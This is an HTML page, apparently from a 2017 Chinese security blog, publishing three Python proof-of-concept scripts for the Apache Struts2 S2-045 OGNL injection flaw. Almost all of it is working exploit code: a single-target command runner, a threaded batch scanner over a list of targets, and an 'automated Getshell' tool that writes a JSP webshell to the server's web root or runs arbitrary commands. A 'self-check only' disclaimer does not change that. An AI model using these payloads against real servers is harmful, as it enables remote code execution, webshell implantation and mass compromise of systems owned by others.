@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>新手上路</title>
+<style>
+			body{
+				width: 100%;
+				height: 100%;
+				background-color:#B2DFEE;
+			}
+			*{
+				margin: 0 auto;
+				padding: 0;
+			}
+
+		</style>
+</head>
+
+<body>
+
+<div>
+<center><br/>
+
+<font style="FONT-FAMILY: Comic Sans MS;">
+<strong><h2>s2-045之POC</h2></strong>版权归原作者-仅作为自我检测使用-请勿作违法行动</font></center><br/>
+<div>
+
+<center>
+<ul>
+<li>
+<textarea rows="37" cols="150">
+#单个检测
+#!/usr/bin/env python
+#coding:utf8
+#Author:Tututu
+__author__ = 'Tututu'
+import urllib2
+import sys
+from poster.encode import multipart_encode
+from poster.streaminghttp import register_openers
+reload(sys)
+sys.setdefaultencoding('utf-8')
+
+def poc():
+    register_openers()
+    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
+    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
+    header["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+    request = urllib2.Request(str(sys.argv[1]), datagen, headers=header)
+    response = urllib2.urlopen(request)
+    print response.read()
+
+poc()
+
+</textarea>
+</li>
+<br/>
+<li>
+<textarea rows="37" cols="150">
+#批量检测
+#!/usr/bin/env python
+#coding:utf8
+#author:ndasec.com
+
+import urllib2
+import sys
+import threading  
+from multiprocessing.dummy import Pool
+from poster.encode import multipart_encode
+from poster.streaminghttp import register_openers
+reload(sys)
+sys.setdefaultencoding('utf-8')
+mutex = threading.Lock()  
+
+def poc(target):
+    
+    global mutex
+    register_openers()
+    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
+    
+    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
+    header["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+    
+    
+    try:
+        request = urllib2.Request(target, datagen, headers=header)
+        response = urllib2.urlopen(request)
+        if '12345678901' in response.read():
+            msg = 'vul is exists'
+        else:
+            msg = 'vul is not exists'
+        mutex.acquire()
+        print [target, str(e)] 
+        mutex.release()         
+        return [target, msg]
+    except Exception as e:
+        mutex.acquire()
+        print [target, str(e)] 
+        mutex.release() 
+        return [target, str(e)]
+
+def main():
+
+    targets = []
+    with open(sys.argv[1], 'r') as f:
+        for line in f.readlines():
+            targets.append(line.strip('\n'))
+                     
+    pool = Pool(20)
+    t = pool.map(poc, targets)
+    pool.close()
+    pool.join()
+    
+    for i in t:
+        print i[0] + ':' + i[1]
+        
+        
+if __name__ == '__main__':
+    main()
+
+</textarea>
+</li>
+<br/>
+
+<li>
+<textarea rows="37" cols="150">
+#自动化Getshell
+#!/usr/bin/env python
+#coding:utf8
+import urllib 
+import urllib2
+import sys,getopt,ctypes
+def exp(url,payload):
+    try:
+        opener = urllib2.build_opener()
+        urllib2.install_opener(opener)
+        req = urllib2.Request(url)
+        req.add_header('Content-Type',payload)
+        return opener.open(req, "").read()
+    except urllib2.URLError,e:
+        return "fail"
+    return "fail"
+class Color:
+    std_out_handle = ctypes.windll.kernel32.GetStdHandle(-11)
+    def print_(self, print_text):
+        print print_text  
+    def print_green_text(self, print_text):  
+        self.set_cmd_color(0x02 | 0x08)  
+        print print_text  
+        self.reset_color()
+    def print_red_text(self, print_text):  
+        self.set_cmd_color(0x04 | 0x08)  
+        print print_text  
+        self.reset_color()
+    def reset_color(self):  
+        self.set_cmd_color(0x04 | 0x02 | 0x01)  
+    def set_cmd_color(self, color, handle=std_out_handle):  
+        bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)  
+        return bool  
+jspCode = "<%new java.io.FileOutputStream(request.getParameter(\\\"f\\\")).write(request.getParameter(\\\"c\\\").getBytes());%>"
+clr = Color()
+clr.print_green_text("S2-045 Exp // w7oami  Usage:localhost/test.jsp?f=2.txt&c=1234")
+opts, args = getopt.getopt(sys.argv[1:], "x:c:p:")
+url,cmd,path = "","",""
+for op, value in opts:
+    if op == '-x':
+        url = value
+    elif op == '-c':
+        cmd = value
+    elif op == '-p':
+        path = value
+if url == "":
+    clr.print_red_text("Useage : exp.py -x url [-c cmd] [-p upfilePath]")
+    sys.exit(0)
+if cmd == "":
+    clr.print_("upload webshell ...")
+    if path == "":
+        path = "#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')"
+    else:
+        path = "'" + path + "'"
+    payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=" + path + ").(#shell='" + jspCode + "').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/test.jsp').append(#shell)).close()).(#cmd='echo \\\"write file to '+#path+'/test.jsp\\\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+else:
+    clr.print_("run " + cmd + " ...")
+    payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+result = exp(url,payload)
+if result == "fail":
+    clr.print_red_text("Exploit Fail")
+else:
+    clr.print_green_text(result)
+
+</textarea>
+</li>
+<p><br/></p>
+<br/>
+<center>
+<h4 >著：2017-3-08 10:15&nbsp;&nbsp; </h4></center></div><br/>
+<center><input type="button" name="button1" id="button1" value="返回上一页" onclick="history.go(-1)"> <br/><br/></center>
+<center><script type="text/javascript">document.write(['<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=',encodeURIComponent(location.href),'&title=',encodeURIComponent(document.title),'" target="_blank"  style="text-decoration:none;"  title="分享到QQ空间">分享到QQ空间<\/a>'].join(''));</script>
+</center>
+</div>
+<br/><br/>
+</body>
+</html>
